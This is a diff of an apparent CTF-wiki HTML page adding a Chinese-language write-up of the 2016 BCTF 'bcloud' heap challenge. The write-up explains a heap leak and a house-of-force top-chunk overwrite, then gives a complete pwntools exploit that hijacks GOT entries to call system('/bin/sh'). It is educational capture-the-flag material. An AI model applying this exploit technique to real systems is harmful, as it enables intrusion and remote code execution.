@@ -391,8 +391,190 @@ bamboobox: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically link
 <p>当然，这一题也可以使用 unlink 的方法来做。</p>
 </div>
 </div>
+<div class="section" id="bctf-bcloud">
+<h2>2016 BCTF bcloud<a class="headerlink" href="#bctf-bcloud" title="永久链接至标题">¶</a></h2>
 <div class="section" id="id9">
-<h2>题目<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h2>
+<h3>基本信息<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h3>
+<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  2016_bctf_bcloud git:(master) file bcloud
+bcloud: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped
+➜  2016_bctf_bcloud git:(master) checksec bcloud
+[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</pre></div>
+</div>
+<p>可以看出，这是一个动态链接的 32 位程序，主要开启了 Canary 保护与 NX 保护。</p>
+</div>
+<div class="section" id="id10">
+<h3>基本功能<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h3>
+<p>程序大概是一个云笔记管理系统。首先，程序会进行一些初始化，设置用户的名字，组织，host。程序主要有以下几个功能</p>
+<ol class="arabic simple">
+<li>新建note，根据用户的输入x申请x+4的空间作为note的大小。</li>
+<li>展示note，啥功能也没有。。</li>
+<li>编辑note，根据用户指定的 note 编辑对应的内容。</li>
+<li>删除note，删除对应note。</li>
+<li>同步note，标记所有的note已经被同步。</li>
+</ol>
+<p>然而在这五个功能中并没有发现啥漏洞，，，重新看程序，结果发现程序在初始化的时候出现了漏洞。。</p>
+<p>初始化名字</p>
+<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">unsigned</span> <span class="nb">int</span> <span class="n">init_name</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">char</span> <span class="n">s</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">1</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">5</span><span class="n">Ch</span><span class="p">]</span>
+  <span class="n">char</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">5</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">1</span><span class="n">Ch</span><span class="p">]</span>
+  <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">v3</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">6</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="n">Ch</span><span class="p">]</span>
+
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14</span><span class="n">u</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x50</span><span class="n">u</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;Input your name:&quot;</span><span class="p">);</span>
+  <span class="n">read_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">);</span>
+  <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="n">u</span><span class="p">);</span>
+  <span class="n">name</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+  <span class="n">info</span><span class="p">(</span><span class="n">tmp</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14</span><span class="n">u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>这里如果程序读入的名字为64个字符，那么当程序在使用info函数输出对应的字符串时，就会输出对应的tmp指针内容，也就是说<strong>泄露了堆的地址</strong>。。</p>
+<p>初始化组织和org的时候存在漏洞</p>
+<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">unsigned</span> <span class="nb">int</span> <span class="n">init_org_host</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">char</span> <span class="n">s</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">1</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">9</span><span class="n">Ch</span><span class="p">]</span>
+  <span class="n">char</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">5</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">5</span><span class="n">Ch</span><span class="p">]</span>
+  <span class="n">char</span> <span class="n">v3</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">60</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">58</span><span class="n">h</span><span class="p">]</span>
+  <span class="n">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="n">A4h</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">14</span><span class="n">h</span><span class="p">]</span>
+  <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">v5</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="n">ACh</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="n">Ch</span><span class="p">]</span>
+
+  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14</span><span class="n">u</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x90</span><span class="n">u</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;Org:&quot;</span><span class="p">);</span>
+  <span class="n">read_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;Host:&quot;</span><span class="p">);</span>
+  <span class="n">read_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+  <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="n">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="n">u</span><span class="p">);</span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="n">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="n">u</span><span class="p">);</span>
+  <span class="n">org</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
+  <span class="n">host</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v3</span><span class="p">);</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;OKay! Enjoy:)&quot;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14</span><span class="n">u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>当读入组织时，给定 64 字节，会覆盖 v2 的低地址。与此同时，我们可以知道 v2 是与 top chunk 相邻的 chunk，而 v2 恰好与 org 相邻，那么由于在 32 位程序中，一般都是 32 位全部都使用，这里 v2
+所存储的内容，几乎很大程度上都不是 <code class="docutils literal"><span class="pre">\x00</span></code> ，所以当执行 strcpy 函数向 v2 中拷贝内容时，很有可能会覆盖top chunk。这就是漏洞所在。</p>
+</div>
+<div class="section" id="id11">
+<h3>利用<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h3>
+<ol class="arabic simple">
+<li>利用初始化名字处的漏洞泄漏堆的基地址。。</li>
+<li>利用 house of force 将 top chunk 分配至全局的 0x0804B0A0 的 &amp;notesize-8 处，当再次申请内存时，便返回notesize地址处的内存，从而我们就可以控制所有note的大小以及对应的地址了。</li>
+<li>修改前三个 note 的大小为16，并修改其指针为 <a class="reference external" href="mailto:free&#37;&#52;&#48;got">free<span>&#64;</span>got</a>，<a class="reference external" href="mailto:atoi&#37;&#52;&#48;got">atoi<span>&#64;</span>got</a>，<a class="reference external" href="mailto:atoi&#37;&#52;&#48;got">atoi<span>&#64;</span>got</a></li>
+<li>将 <a class="reference external" href="mailto:free&#37;&#52;&#48;got">free<span>&#64;</span>got</a> 修改为 <a class="reference external" href="mailto:puts&#37;&#52;&#48;plt">puts<span>&#64;</span>plt</a>。</li>
+<li>泄漏 atoi 地址。</li>
+<li>再次修改另外一个 atoi got 项为 system 地址，从而拿到shell。</li>
+</ol>
+<p>具体脚本如下</p>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;gnome-terminal&#39;</span><span class="p">,</span> <span class="s1">&#39;-x&#39;</span><span class="p">,</span> <span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">]</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./bcloud&quot;</span>
+<span class="n">bcloud</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./bcloud&quot;</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">7777</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./bcloud&quot;</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;PID: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">offset_bin_main_arena</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">word_bytes</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">/</span> <span class="mi">8</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="mi">4</span>  <span class="c1"># lock</span>
+    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">4</span>  <span class="c1"># flags</span>
+    <span class="n">offset</span> <span class="o">+=</span> <span class="n">word_bytes</span> <span class="o">*</span> <span class="mi">10</span>  <span class="c1"># offset fastbin</span>
+    <span class="n">offset</span> <span class="o">+=</span> <span class="n">word_bytes</span> <span class="o">*</span> <span class="mi">2</span>  <span class="c1"># top,last_remainder</span>
+    <span class="n">offset</span> <span class="o">+=</span> <span class="n">idx</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">word_bytes</span>  <span class="c1"># idx</span>
+    <span class="n">offset</span> <span class="o">-=</span> <span class="n">word_bytes</span> <span class="o">*</span> <span class="mi">2</span>  <span class="c1"># bin overlap</span>
+    <span class="k">return</span> <span class="n">offset</span>
+
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+    <span class="c1"># leak heap base</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;Input your name:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">64</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Hey &#39;</span> <span class="o">+</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">64</span><span class="p">)</span>
+    <span class="c1"># sub name&#39;s chunk&#39; s header</span>
+    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="mi">8</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;heap_base: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;Org:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">64</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Host:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">))</span>
+    <span class="c1"># name,org,host, for each is (0x40+8)</span>
+    <span class="n">topchunk_addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x40</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
+
+    <span class="c1"># make topchunk point to 0x0804B0A0-8</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">notesize_addr</span> <span class="o">=</span> <span class="mh">0x0804B0A0</span>
+    <span class="n">notelist_addr</span> <span class="o">=</span> <span class="mh">0x0804B120</span>
+    <span class="n">targetaddr</span> <span class="o">=</span> <span class="n">notesize_addr</span> <span class="o">-</span> <span class="mi">8</span>
+    <span class="n">offset_target_top</span> <span class="o">=</span> <span class="n">targetaddr</span> <span class="o">-</span> <span class="n">topchunk_addr</span>
+    <span class="c1"># 4 for size_t, 7 for malloc_allign</span>
+    <span class="n">malloc_size</span> <span class="o">=</span> <span class="n">offset_target_top</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">7</span>
+    <span class="c1"># plus 4 because malloc(v2 + 4);</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the length of the note content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span>
+                    <span class="nb">str</span><span class="p">(</span><span class="n">malloc_size</span> <span class="o">-</span> <span class="mi">4</span><span class="p">))</span>
+    <span class="c1"># most likely malloc_size-4&lt;0...</span>
+    <span class="k">if</span> <span class="n">malloc_size</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+
+    <span class="c1">#gdb.attach(p)</span>
+    <span class="c1"># set notesize[0] = notesize[1] = notesize[2]=16</span>
+    <span class="c1"># set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the length of the note content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1000</span><span class="p">))</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="p">(</span><span class="n">notelist_addr</span> <span class="o">-</span> <span class="n">notesize_addr</span> <span class="o">-</span> <span class="mi">12</span><span class="p">)</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span>
+        <span class="n">bcloud</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bcloud</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">])</span> <span class="o">*</span> <span class="mi">2</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+    <span class="c1"># overwrite free@got with puts@plt</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the id:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the new content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">bcloud</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]))</span>
+
+    <span class="c1"># leak atoi addr by fake free</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the id:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+    <span class="n">atoi_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">atoi_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
+    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;libc base addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+    <span class="c1"># overwrite atoi@got with system</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the id:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the new content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+
+    <span class="c1"># get shell</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">exp</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="id12">
+<h2>题目<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h2>
+<ul class="simple">
+<li><a class="reference external" href="https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6">2016 Boston Key Party CTF cookbook</a></li>
+</ul>
 </div>
 </div>
 
@@ -485,7 +667,13 @@ bamboobox: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically link
 <li class="toctree-l4"><a class="reference internal" href="#id8">利用</a></li>
 </ul>
 </li>
-<li class="toctree-l3"><a class="reference internal" href="#id9">题目</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#bctf-bcloud">2016 BCTF bcloud</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id9">基本信息</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id10">基本功能</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id11">利用</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id12">题目</a></li>
 </ul>
 </li>
 <li class="toctree-l2"><a class="reference internal" href="unsorted_bin_attack.html">Unsorted Bin Attack</a></li>
